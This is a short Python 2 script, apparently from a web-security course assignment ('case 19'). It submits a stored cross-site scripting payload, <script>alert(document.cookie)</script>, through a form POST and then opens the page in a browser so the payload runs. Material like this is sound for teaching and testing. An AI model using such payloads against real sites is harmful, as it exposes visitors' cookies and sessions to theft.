#sample exploit for sample case
import urllib, urllib2, cookielib

# do POST to the fworm
url_2 = 'http://www.wsb.com/Assignment2/case19.php'
# prepare the value of the form which includes the attack payload
values = dict(title='EXPLOIT FOR CASE 19 <script>alert(document.cookie)</script>', content='Exploit... ' )
data = urllib.urlencode(values)
#submit the form
req = urllib2.Request(url_2, data)
rsp = urllib2.urlopen(req)
#read the return result
content = rsp.read()

import webbrowser
new = 2 #open in new window
webbrowser.open(url_2,new=new)
